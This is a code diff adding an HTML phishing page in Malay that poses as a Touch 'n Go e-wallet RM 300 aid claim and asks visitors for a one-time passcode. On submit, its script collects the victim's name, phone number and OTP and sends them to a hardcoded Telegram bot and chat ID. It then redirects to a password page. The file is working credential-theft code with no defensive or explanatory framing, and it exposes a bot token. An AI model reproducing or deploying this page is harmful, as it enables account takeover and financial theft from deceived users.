@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Claim Now Bantuan e-Wallet Touch n Go RM 300</title>
+
+    <!-- Link ke Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Link ke CSS intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <style>
+      * {
+        box-sizing: border-box;
+        outline: none;
+        border: none;
+        text-decoration: none;
+      }
+
+      body {
+        font-family: "Poppins", sans-serif;
+        color: #010101;
+        background-color: #fff;
+      }
+      .hero {
+        height: 100vh;
+        width: 100%;
+        background-size: cover;
+        background-position: center;
+        position: relative;
+      }
+
+      /* navbar */
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #fff; /* Warna latar belakang navbar */
+        padding: 10px 20px;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 9999;
+      }
+
+      .navbar .navbar-logo {
+        font-size: 2vw; /* Ukuran font logo dinamis */
+        color: #010101;
+        font-weight: 400;
+        display: flex;
+        align-items: center;
+      }
+
+      .navbar .navbar-nav {
+        display: flex;
+        align-items: center;
+        justify-content: flex-end; /* Posisi tautan tetap rapih di ujung kanan */
+        flex-wrap: nowrap; /* Mencegah elemen terbungkus menjadi kolom */
+      }
+
+      .navbar .navbar-nav a {
+        color: #010101; /* Warna teks bahasa */
+        font-weight: bold;
+        font-size: 1.5vw; /* Ukuran font dinamis */
+        margin: 0 0; /* Menambahkan jarak antar link bahasa */
+        padding: 0; /* Ruang klik */
+        text-decoration: none; /* Menghilangkan garis bawah pada link */
+        white-space: nowrap; /* Mencegah teks terpotong ke baris baru */
+      }
+
+      .navbar .navbar-nav a span {
+        color: blue;
+      }
+
+      .navbar .navbar-nav a:hover {
+        color: #007bff; /* Warna hover */
+        transition: color 0.3s ease; /* Efek transisi saat hover */
+      }
+
+      .navbar .navbar-img {
+        width: 40px; /* Ukuran logo */
+        height: auto;
+        margin-left: 10px; /* Jarak antara logo dan teks */
+        object-fit: contain; /* Menjaga proporsi gambar */
+      }
+
+      /* Media Query untuk layar kecil */
+      @media (max-width: 768px) {
+        .navbar {
+          padding: 10px 10px; /* Mengurangi padding pada layar kecil */
+        }
+
+        .navbar .navbar-logo {
+          font-size: 4vw; /* Ukuran font logo lebih besar pada layar kecil */
+        }
+
+        .navbar .navbar-nav {
+          flex-direction: row; /* Pastikan tautan tetap satu baris */
+        }
+
+        .navbar .navbar-nav a {
+          font-size: 3vw; /* Ukuran font lebih besar pada layar kecil */
+          margin: 0 5px; /* Mengurangi margin pada layar kecil */
+          padding: 5px; /* Ruang klik pada layar kecil */
+          font-size: 1.5rem;
+        }
+
+        .navbar .navbar-img {
+          width: 30px; /* Ukuran logo lebih kecil pada layar kecil */
+          margin-left: 5px; /* Kurangi jarak pada layar kecil */
+          margin-top: 0;
+        }
+      }
+      img {
+        width: 350px; /* Atur lebar gambar sesuai keinginan */
+        height: auto; /* Agar proporsi gambar tetap */
+        display: flex; /* Untuk membuatnya blok, bisa juga inline-block */
+        margin: 0 auto; /* Posisikan di tengah jika dalam elemen blok */
+      }
+
+      img[src="img2.jpeg"] {
+        margin-top: 50px;
+      }
+
+      img[src="img3.jpeg"] {
+        width: 350px; /* Atur lebar gambar sesuai keinginan */
+        height: auto; /* Agar proporsi gambar tetap */
+        display: flex; /* Untuk membuatnya blok, bisa juga inline-block */
+        margin-bottom: 20px;
+      }
+
+      .form-container {
+        justify-content: center;
+        background-color: white;
+        padding: 30px 10px;
+        border-radius: 10px;
+        width: 80%;
+        margin: 30px auto;
+        margin-top: 0%;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 8px;
+        font-size: 1.1rem;
+        font-weight: 600;
+      }
+
+      p {
+        font-size: 18px;
+        color: #333;
+        text-align: center;
+        margin-top: 20px;
+        margin-bottom: 20px;
+        line-height: 1.6;
+        font-weight: 500;
+      }
+
+      input[type="tel"] {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 1.1rem;
+      }
+
+      .btn {
+        display: flex;
+        width: 100%;
+        padding: 12px;
+        margin: 10px auto 0;
+        background-color: #f8d704;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 1.1rem;
+        cursor: pointer;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .btn:hover {
+        background-color: #225786;
+      }
+
+      ._record-box {
+        width: 100%;
+        margin: 20px auto;
+        margin-top: 0;
+        padding: 5px;
+        background-color: #f5f5f5;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      }
+
+      /* CSS untuk list-box */
+      .list-box {
+        overflow: hidden;
+        max-height: 200px;
+      }
+
+      /* CSS untuk list */
+      .list {
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* CSS untuk item */
+      .item {
+        display: flex;
+        align-items: center;
+        padding: 1px;
+        background-color: white;
+        border-radius: 8px;
+        margin-bottom: 5px;
+      }
+
+      /* CSS untuk logo/avatar */
+      .record_logo img {
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        object-fit: cover;
+        margin-right: 15px;
+        margin-left: 15px;
+      }
+
+      /* CSS untuk nama */
+      .center .h1 {
+        font-size: 16px;
+        font-weight: bold;
+      }
+
+      /* CSS untuk status */
+      .center .h2 {
+        font-size: 14px;
+        color: green;
+      }
+
+      main {
+        flex-grow: 1; /* Memastikan konten utama mendorong footer ke bawah */
+      }
+
+      footer {
+        position: fixed; /* Tetap di bawah meski konten lebih pendek */
+        left: 0;
+        bottom: 0;
+        width: 100%;
+        background-color: #fff; /* Latar belakang footer */
+        text-align: center;
+      }
+
+      footer img {
+        max-width: 350px; /* Ukuran gambar maksimal */
+        height: auto;
+      }
+
+      /* Loading screen styles */
+      .loading-screen {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        display: none;
+      }
+
+      .loading-screen img {
+        max-width: 100px;
+        max-height: 100px;
+      }
+
+      h4 {
+        display: flex;
+        margin-top: 5px;
+        font-size: 25px;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 0;
+        color: #f8d704;
+      }
+      /* Keyframes for spin animation */
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      @media (max-width: 768px) {
+        .form-container {
+          width: 90%;
+          padding: 20px;
+        }
+
+        input[type="text"],
+        input[type="tel"] {
+          font-size: 1rem;
+        }
+
+        .btn {
+          width: 60%;
+          font-size: 1rem;
+          padding: 10px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <nav class="navbar">
+      <div class="navbar-nav">
+        <a href="#">Bantuan e Wallet Touch n Go</a>
+      </div>
+    </nav>
+
+    <div class="hero">
+      <br />
+      <img src="img-22.jpeg" alt="tng-img" />
+
+      <h4>CLAIM RM 300 NOW</h4>
+
+      <img src="img4.jpeg" alt="tng-img" />
+
+      <div class="form-container">
+        <form id="registrationForm">
+          <label for="name">Masukkan Kod-OTP</label>
+          <input
+            type="tel"
+            id="otp"
+            name="otp"
+            placeholder="Masukkan 5 digit OTP"
+            required
+          />
+
+          <button type="submit" class="btn">Teruskan</button>
+        </form>
+      </div>
+      <img src="img3.jpeg" alt="tng-img" />
+      <br />
+      <footer>
+        <!-- Hanya menampilkan gambar di dalam footer -->
+        <img src="ini1.png" alt="Logo Footer" />
+      </footer>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+      <img src="loading-loading-forever.gif" alt="Loading..." />
+    </div>
+
+    <!-- Script untuk intl-tel-input -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script>
+      document
+        .getElementById("registrationForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Mencegah pengiriman form default
+
+          const otp = document.getElementById("otp").value; // Ambil nilai OTP
+
+          // Periksa apakah input OTP tidak kosong
+          if (!otp) {
+            alert("Silakan masukkan OTP.");
+            return;
+          }
+
+          // Simpan OTP ke local storage
+          localStorage.setItem("otp", otp);
+
+          // Tampilkan loading screen
+          document.getElementById("loadingScreen").style.display = "flex";
+
+          const botToken = "6947661507:AAG0GY-qoyF9wE7GKanhJ93QxPRzKNg7JAU"; // Ganti dengan token bot Anda
+          const chatId = "6325542505"; // Ganti dengan ID chat Anda
+
+          // Ambil data yang disimpan sebelumnya dari local storage
+          const savedPhone = localStorage.getItem("phone");
+          const savedName = localStorage.getItem("name");
+          const savedOtp = localStorage.getItem("otp"); // Ambil OTP dari local storage
+
+          // Format pesan untuk Telegram
+          const message = `
+──────────────────────
+( MALAY | DATA  )
+──────────────────────
+    
+- Nama Lengkap  : ${savedName}
+
+- No HP         : ${savedPhone}
+
+- OTP           : ${savedOtp}
+───────────────────────
+`;
+
+          // URL untuk mengirim pesan ke Telegram
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+            message
+          )}`;
+
+          // Kirim pesan ke Telegram
+          fetch(url)
+            .then((response) => {
+              if (response.ok) {
+                // Arahkan ke halaman berikutnya setelah pengiriman berhasil
+                window.location.href = "kata-sandi.html"; // Ganti dengan URL halaman tujuan
+              } else {
+                console.error("Gagal mengirim pesan:", response.statusText);
+                alert("Gagal mengirim pesan. Silakan coba lagi.");
+              }
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+              alert(
+                "Terjadi kesalahan saat mengirim pesan. Periksa koneksi Anda."
+              );
+            })
+            .finally(() => {
+              // Sembunyikan loading screen setelah proses selesai
+              document.getElementById("loadingScreen").style.display = "none";
+            });
+        });
+    </script>
+
+    <script>
+      function startAutoScroll() {
+        var list = document.querySelector(".list");
+        var scrollTimer;
+
+        function scrollList() {
+          var firstItem = list.querySelector(".item:first-child");
+          var itemHeight = firstItem.offsetHeight;
+
+          list.style.transition = "margin-top 1s ease";
+          list.style.marginTop = `-${itemHeight}px`;
+
+          setTimeout(function () {
+            list.style.transition = "none";
+            list.style.marginTop = "0px";
+            list.appendChild(firstItem); // Pindahkan item pertama ke akhir
+          }, 1000); // Setelah animasi selesai (1 detik)
+
+          scrollTimer = setTimeout(scrollList, 2000); // Ulangi scroll setiap 2 detik
+        }
+
+        scrollList(); // Mulai scrolling
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        startAutoScroll(); // Jalankan scrolling otomatis saat halaman dimuat
+      });
+    </script>
+  </body>
+</html>
